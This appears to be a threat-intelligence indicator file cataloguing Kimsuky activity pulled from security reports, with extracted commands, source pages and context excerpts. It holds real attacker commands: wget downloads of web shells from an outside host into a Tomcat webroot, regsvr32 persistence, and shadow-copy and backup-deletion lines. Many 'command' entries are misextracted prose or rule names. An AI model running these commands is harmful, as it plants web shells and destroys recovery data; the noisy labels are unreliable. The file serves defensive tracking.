1.0.0,actor--kimsuky,artifact--sha256:afb3cbfd03af7a1d59de993222874564457b6cba2d915687d93624b02328d148,observation--sha256:a3384b74a28aa5dde2ef4f5cb6a7e514e03cc1ce1696b1b0dc5294e4bfad6106,command,wget http://designinvent.co.kr/jsp.b -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist1.jspx,wget http://designinvent.co.kr/jsp.b -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist1.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:b1981c2927c98bc30616351cb65dfa15104d6517a76ac0d955ed14c2b9a9d3a3,observation--sha256:3f9420af4972a552bd5d46614cf18f92e76184a4e8c85aae7b839b41167f5b14,command,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about3.jsp,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about3.jsp,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:799d90f9c63a196dba816999716fb663e9bb5fda44875d6dc287c235c51c259c,observation--sha256:070b337260de9ed4ea22f680556ae30da9515cedcc232c24605f6a2e9810e632,command,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about3.txt,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/about3.txt,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:a15d9b01e7a3a73085d146b321d7f9e740ed018f3c65ee3009fa5253eeeda85a,observation--sha256:68a061984c5226d7924048a5b09ecc388a19b5e33cfc80e578d3c8ac3b0eecd4,command,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jsp,wget http://designinvent.co.kr/s.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jsp,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 13}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 13VIRUS BULLETIN CONFERENCE OCTOBER 2021 wget http://designinvent.co.kr/c.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx wget http://designinvent.co.kr/a.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget http://designinvent.co.kr/a.txt -O /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.txt wget h,
1.0.0,actor--kimsuky,artifact--sha256:5cee238d3ffd848b05e50ceb8a60bdf061ef2ff547b1f4dd574227b3f56eecb1,observation--sha256:d0f81081049a02f2de6e71524fe77ac3af0b0741aadadf1c731cd4500768c428,command,wget http://designinvent.co.kr/test.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,wget http://designinvent.co.kr/test.txt -o /apache/apache-tomcat-7.0.103/webapps/ROOT/newlist.jspx,candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:c59f873e5dd2065b35822472d7099b775c99e45110073bdecd55dd35f437e490,observation--sha256:076159e8bf130a640cc266c9adc9ee5e6abc37f787c38ee580352390660f45bc,command,with heavily obfuscated PowerShell substitution.,with heavily obfuscated PowerShell substitution,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 Rapid7 also observed a recent version with an embedded payload that uses PowerShell to extract to %temp% before execution. Similarly, a previous version of Kimsuky LNK payloads uses the same embedded payload method of extraction with heavily obfuscated PowerShell substitution. Figure 7 - Heavily obfuscated embedded payload variant Rapid7 observed several techniques to bypass lazy signatures or tooling limitations: • Move towards in-memory execution to limit dropping malware binaries on disk • ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:efcd998817960298a60c5dd4ab11875717ae10e2991d9b4da1701dd11d3d8e99,observation--sha256:0748eef981fd5a78bdd0128610fc8b715bc9c4d1209b182f1019121e849108d2,command,wmic shadowcopy delete,wmic shadowcopy delete,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--63ae4d17fc4647a6,kimsuky/20231101_Kimsuky_OP.-Covert-Stalker-EN.pdf,"{""page"": 27}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"When BlacBit ransomware is executed, delete Windows setting information (Table 7) below or turn off the function. bcdedit /set {default} recoveryenabled no 27 For example, deleting a volume shadow copy or backup catalog can be recovered when files are encrypted by ransomware infection. Delete backup catalog (Table 7) Windows settings changed due to BlackBit ransomware infection Ex) (blackfilesupport@firemail.cc)(C8084352)svchost.exe_.i64.BlackBit wbadmin delete catalog -quiet ÿ Ransom note creat",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:5d7a4ce1506f1ffa14bb281fe745ff5dff92f7349496efd4c9bc7caaebd083b5,observation--sha256:cf4d06178a24629cc9f2719f3cb9892754f2e5805f4a0eafab1fcd0d413b3f8d,command," Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg"," Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 12}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 12 VIRUS BULLETIN CONFERENCE OCTOBER 2021  Taskrun (command): C:\Windows\system32\regsvr32.exe/s""C:\ProgramData\Intel\Driverdriver.cfg""  Schedule type: every 30min 4.2 Command and scripting interpreter On a Linux server, after infiltrating the internal server, the web shell was downloaded from the outside using the CLI command, and execution permission was granted. After downloading the file from the outside through the",
1.0.0,actor--kimsuky,artifact--sha256:5c18e214d92f527eb67d7530b9ff3faefc41e09e9562f2b43252195fa594e6c1,observation--sha256:84d05854134a5b13ef64447d6813eb9ca6a648fa18b9ee64fdc2eba58d1eb06a,command,• Attacker Technique - PowerShell Concatenation Obfuscation,• Attacker Technique - PowerShell Concatenation Obfuscation,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:53c5e0c675498b023a3733b344a2bdc18346f3da47af548401fea66c64216d58,observation--sha256:34b4f5fee6493bc64c973ac58ab603c0c402cdbe619fe456117f9fa54ce9438b,command,• Embedded files double base64 encoded — ActiveX decode and certutil combined,• Embedded files double base64 encoded — ActiveX decode and certutil combined,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 In another example of JavaScript execution of Kimsuky AppleSeed malware, Rapid7 observed use of double base64 encoding of both payload and lure. In this case execution contained an ActiveX decode and the well known lolbin certutil. Some other examples used in this javascript: • Simple string concatenation to obfuscate detection efforts • Variable substitution • Simple folder traversal e.g C:\Windows\..\ProgramData\ = C:\ProgramData\ • Embedded files double base64 encoded — ActiveX decode and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0e190eba90614ff6e4735149510c025b1f933448a021775bf25ff98c11d2beca,observation--sha256:d9e134e351656c9e52e3d321d22959ebecf5da256c5b9d1c3097d52eca375c53,command,• Obfuscating with PowerShell cmd ^ ticks: These will not execute directly in,• Obfuscating with PowerShell cmd ^ ticks: These will not execute directly in,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 9}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"9 Rapid7 also observed a recent version with an embedded payload that uses PowerShell to extract to %temp% before execution. Similarly, a previous version of Kimsuky LNK payloads uses the same embedded payload method of extraction with heavily obfuscated PowerShell substitution. Figure 7 - Heavily obfuscated embedded payload variant Rapid7 observed several techniques to bypass lazy signatures or tooling limitations: • Move towards in-memory execution to limit dropping malware binaries on disk • ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:051df33a6592474790c4a5712a5a8dda32528173757a468e4b61054e9e998fd0,observation--sha256:6e9177ba69af98080e57c1b6f4c4b5b7de717027823125fcfaeb4053c1c6eee0,command,• PowerShell - Concatenate Strings,• PowerShell - Concatenate Strings,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:bf6eaff76dc3bb46e746987882228290e4f11d46d74b655387d49f35e90bf7a9,observation--sha256:e96d271428c56a7e1c15dbedb7eaeb7120e4b12a6a24e644d8ef791cd19b2805,command,• PowerShell - Obfuscated Script,• PowerShell - Obfuscated Script,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:2619785f49bed1dc5313883580ba9be9c6a9784fbbe318b63413bce3f1e77984,observation--sha256:e5df9c23adf9e8b2d76329a6bb5c0b914cd02df3b19816e3a5756b55ac2c2711,command,"• PowerShell, BAT file, or Windows Scripting Host and simple command and control","• PowerShell, BAT file, or Windows Scripting Host and simple command and control",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 13}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"13 In another example of JavaScript execution of Kimsuky AppleSeed malware, Rapid7 observed use of double base64 encoding of both payload and lure. In this case execution contained an ActiveX decode and the well known lolbin certutil. Some other examples used in this javascript: • Simple string concatenation to obfuscate detection efforts • Variable substitution • Simple folder traversal e.g C:\Windows\..\ProgramData\ = C:\ProgramData\ • Embedded files double base64 encoded — ActiveX decode and ",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:0d8654b32396be91f729c411643ba63efc0e34ac4baff80d10cb85787ceead1c,observation--sha256:ceeeab9315e8d9a0b4b1a2bb52688fd4e99600e3f3d273e131248445ff5824e1,command,• Suspicious Process - CHM File Runs CMD.exe to Run Certutil,• Suspicious Process - CHM File Runs CMD.exe to Run Certutil,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:bbba7ac8bfb0b9d446e878d63849ff67fab018340620b614e472f6c1554db7d1,observation--sha256:2f294e8ec2fc2656a8a28151f0b9f8f47531d74807779b10954c1d2b46fd915d,command,• Suspicious Process - PowerShell IO.MemoryStream,• Suspicious Process - PowerShell IO.MemoryStream,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:01f505c34c379aae7660e995b308d37af5f4a11e7d5e4ea339d88033ee622229,observation--sha256:3b8f829dd183d29b449546cc230fe8e1a5714f17b746062686274aff420c8f35,command,• Suspicious Process - XORed Data in PowerShell,• Suspicious Process - XORed Data in PowerShell,candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 16}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"16 Conclusion Despite deployment of moderate technical capabilities, Kimsuky’s skill in social engineering and persistent approach makes them a formidable adversary. As we track Kimsuky, it remains clear one of the best mitigations is vigilance. This includes both hardening with technical controls around email or corporate monitoring, and the softer side user awareness training or sharing research. Rapid7 Labs will continue researching and publishing insights and guidance on defending against pe",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:761abc2ee9d4d3d6ce4d378f378a44d7956a06dbc40547a6f7216745d87dc784,observation--sha256:6c5af15bfcdc4d3db2a26b50405fcef6c0ec9f90f5bd6bc3e5f000fc5a2f57fe,command,"• System binary proxy execution (T1218) with rundll32, regsvr32, and others.","• System binary proxy execution (T1218) with rundll32, regsvr32, and others",candidate,,unknown,unknown,not-stated,,source--kimsuky-corpus--f2a5c395add9beae,kimsuky/rapid7-Kimsukys-Phishing-and-Payload-Tactics_wp.pdf,"{""page"": 14}",[],[],[],[],0,false,medium,TLP:CLEAR,pdf-text,"14 • Remote access capabilities, including exfiltration of collected data • Interest in open source .NET and custom Golang RATs • Packing and simple obfuscation techniques to mask malware from basic detection methods • Custom encryption and LOLbin techniques like automated exfil and Base64 certutil encoding A technical deep dive of all Kimsuky malware is beyond the scope of this paper, however, we have included a brief description of some of the common Windows malware for further reading and res",Actor-directory corpus sweep; ambiguous values remain candidates.
1.0.0,actor--kimsuky,artifact--sha256:ef33d146c177b9f742f50b5a06edfd2eab82f76a49f6472f1a969ae75a993eff,observation--sha256:3bbb8b57c7610e8465ee7588a219977191751d2fae15b707d7cc58e2462835f1,command,"② In case of malicious code, the DLL file to be executed is injected into the normal process (rundll32.exe) and executed.","② In case of malicious code, the DLL file to be executed is injected into the normal process (rundll32.exe) and executed",candidate,,unknown,unknown,not-stated,2021-10-01T00:00:00Z,source--operation-newton,kimsuky/Operation_Newton_Kimsuky-APPLE(SEED).pdf,"{""page"": 14}","[""activity--operation-newton""]","[""malware--appleseed""]","[""infra--compromised-web-servers""]","[""c2"",""download"",""exfiltration"",""payload""]",1,false,high,TLP:CLEAR,pdf-text,"OPERATION NEWTON: HI KIMSUKY? DID AN APPLE(SEED) REALLY FALL... KIM ET AL. 14 VIRUS BULLETIN CONFERENCE OCTOBER 2021 And ② in case of malicious code, the encoded file inside is XOR-decoded and executed. (KEY:0xCC) 6.2 Process injection: dynamic-link library injection ② In case of malicious code, the DLL file to be executed is injected into the normal process (rundll32.exe) and executed. 6.3 Masquerading: match legitimate name or location To hide the operation of the malware, it is disguised by u",
1.0.0,actor--kimsuky,artifact--sha256:649c7dcea895ab39aef895d15339026806a9bb0ff58664aff751eac0e3c58651,observation--sha256:9eb3bac805b8d3daa40d9c505dc09568e7a759b6eb46515101d968c777561f2f,command,"○ 2022년 초부터 다양한 유형의 CHM 공격이 발견됐으며, Powershell 코드와레지스트리경로및파일저장경로등의유사도면에서동일한공격자의소행인것으로추정하고있습니다.","○ 2022년 초부터 다양한 유형의 CHM 공격이 발견됐으며, Powershell 코드와레지스트리경로및파일저장경로등의유사도면에서동일한공격자의소행인것으로추정하고있습니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 29}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 4. 유사도분석(SimilarityAnalysis)4.1.타임라인(Timeline) ○ GSC 는 악성 CHM 파일의실행과정에서악용되는VBS, JSE 파일을통해유형을분류하고추적및분석을진행했습니다. ○CHM공격은현재까지지속적으로발견되고있으며, 보안솔루션의탐지및차단을피하기 위해 점차 고도화되는 양상을 띄고 있습니다. VBS 파일을 악용하는 형태로시작해최근에는JSE파일을악용하며, 점차변화하는모습을보이고있습니다. ○ 2022년 초부터 다양한 유형의 CHM 공격이 발견됐으며, Powershell 코드와레지스트리경로및파일저장경로등의유사도면에서동일한공격자의소행인것으로추정하고있습니다. [그림4-1] CHM공격타임라인 Genians SecurityCenter 28",
1.0.0,actor--kimsuky,artifact--sha256:7b663416d1f46439dae250ed6e57921564c45f118cc3f76f52286651cdaeb77b,observation--sha256:81225a88dac5500cbe6a663a7d2373f04124798b3706c56e5ff483660b873bb0,command,"○ GSC 는 그동안 유포됐던 다수의 악성 CHM 파일을 유형별로 분류하고 분석을진행했습니다. 이 과정에서 Powershell 코드, 최종 페이로드 및 C2 도메인에서Kimsuky 그룹과의유사성을확인할수있었으며, 공격의배후로Kimsuky 를추정하고있습니다.","○ GSC 는 그동안 유포됐던 다수의 악성 CHM 파일을 유형별로 분류하고 분석을진행했습니다. 이 과정에서 Powershell 코드, 최종 페이로드 및 C2 도메인에서Kimsuky 그룹과의유사성을확인할수있었으며, 공격의배후로Kimsuky 를추정하고있습니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 58}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 5. 결론및대응방법(Conclusion) ○ GSC 는 그동안 유포됐던 다수의 악성 CHM 파일을 유형별로 분류하고 분석을진행했습니다. 이 과정에서 Powershell 코드, 최종 페이로드 및 C2 도메인에서Kimsuky 그룹과의유사성을확인할수있었으며, 공격의배후로Kimsuky 를추정하고있습니다. ○ CHM 공격은 주로 피싱 메일에 포함된 첨부 파일 또는 다운로드 링크를 통해이뤄지고있습니다. 따라서수신메일의발신자주소스펠링을주의깊게확인해야하고출처가 불분명한 이메일에 포함된 링크나 첨부 파일을 클릭하지 않도록 주의해야합니다. ○최근에는Microsoft 가Windows 에서의VBS 기능사용의중지를발표 하면서JSE 11 등과 같은 파일이 악용되거나 새로운 유형의 공격이 발견될 가능성이 커지고 있어주의가필요합니다. 11 Microsoft - Resources for deprecatedfeatures Genians SecurityCenter 57",
1.0.0,actor--kimsuky,artifact--sha256:5352183c0ea91ffed9d27a349e8ddc3ba2260144e291b2d239460b0283f2d132,observation--sha256:de917f361c20b08638e3707ad67c12715342a91c3b64680b5befe9fc217cce8f,command,"○ 레지스트리에 추가된 뒤 자동 실행될 경우에는 매개변수가 주어지지 않기때문에else 에 해당하는 코드가 실행되며, Powershell 을 통해 C2 서버에서 “ctfmon.exe”파일을다운로드하고실행합니다.","○ 레지스트리에 추가된 뒤 자동 실행될 경우에는 매개변수가 주어지지 않기때문에else 에 해당하는 코드가 실행되며, Powershell 을 통해 C2 서버에서 “ctfmon.exe”파일을다운로드하고실행합니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 44}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○최종실행되는코드는아래와같습니다. 매개변수의길이가0보다클경우, 해당JSE파일을레지스트리자동실행경로에등록합니다. HTML파일의스크립트에서해당JSE파일을실행할때매개변수로“P” 를사용했기때문에조건문은참이됩니다. ○ 레지스트리에 추가된 뒤 자동 실행될 경우에는 매개변수가 주어지지 않기때문에else 에 해당하는 코드가 실행되며, Powershell 을 통해 C2 서버에서 “ctfmon.exe”파일을다운로드하고실행합니다. [그림4-18] JSE2유형의JSE코드 [그림4-19] JSE2유형탐지 Genians SecurityCenter 43",
1.0.0,actor--kimsuky,artifact--sha256:e56de13f2e819c862c7ba06e2059b4dfeb267fe3c7cb3786e675d130135b95dc,observation--sha256:648a9ea7e1b098d34e20edea464a8083805004560f2fe6aeb875d6605552d716,command,"○Genian EDR 은난독화된VBS, JSE, Powershell 등을악용한악성행위와정보수집및 탈취 이벤트의 흐름을 빠르고 정확하게 탐지할 수 있도록 가시성을 제공하고있습니다. 악성CHM 파일의이상행위위협이벤트를시각화하여실행단계별흐름을신속하게파악하고대응할수있습니다.","○Genian EDR 은난독화된VBS, JSE, Powershell 등을악용한악성행위와정보수집및 탈취 이벤트의 흐름을 빠르고 정확하게 탐지할 수 있도록 가시성을 제공하고있습니다. 악성CHM 파일의이상행위위협이벤트를시각화하여실행단계별흐름을신속하게파악하고대응할수있습니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 59}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport 5.1. GenianEDR제품을통한위협탐지및대응 ○Genian EDR 은난독화된VBS, JSE, Powershell 등을악용한악성행위와정보수집및 탈취 이벤트의 흐름을 빠르고 정확하게 탐지할 수 있도록 가시성을 제공하고있습니다. 악성CHM 파일의이상행위위협이벤트를시각화하여실행단계별흐름을신속하게파악하고대응할수있습니다. [그림5-1] 스토리라인흐름도 Genians SecurityCenter 58",
1.0.0,actor--kimsuky,artifact--sha256:e36d39a1e36d120e15239245a5caca44c3e2cf8982d30b598ab01b98c3d19349,observation--sha256:725d5fb4eaad3dcf28bbf8b56783fabeb50729796c7aedb94fe9fc0b94a6462e,command,"○JSE파일은인코딩된JavaScript 로디코딩과정을거쳐야원본코드를확인할수있습니다. 최종실행되는JSE파일의원본코드는아래그림과같으며,Powershell 을통해공격자의C2서버에서“audiodg.exe” 라는악성코드를‘%tmp%’ 경로에다운로드하고실행합니다.","○JSE파일은인코딩된JavaScript 로디코딩과정을거쳐야원본코드를확인할수있습니다. 최종실행되는JSE파일의원본코드는아래그림과같으며,Powershell 을통해공격자의C2서버에서“audiodg.exe” 라는악성코드를‘%tmp%’ 경로에다운로드하고실행합니다",candidate,,unknown,unknown,not-stated,2023-10-16T00:00:00Z,source--darkhorse-2023,kimsuky/20231016_threat_inteligence_report_DarkHorse.pdf,"{""page"": 35}","[""activity--darkhorse""]",[],"[""infra--lookalike-domains""]","[""c2"",""payload"",""phishing""]",1,false,medium,TLP:CLEAR,pdf-text,"Threat IntelligenceReport ○JSE파일은인코딩된JavaScript 로디코딩과정을거쳐야원본코드를확인할수있습니다. 최종실행되는JSE파일의원본코드는아래그림과같으며,Powershell 을통해공격자의C2서버에서“audiodg.exe” 라는악성코드를‘%tmp%’ 경로에다운로드하고실행합니다. [그림4-9] JSE1유형의DAT, JSE파일 Genians SecurityCenter 34",
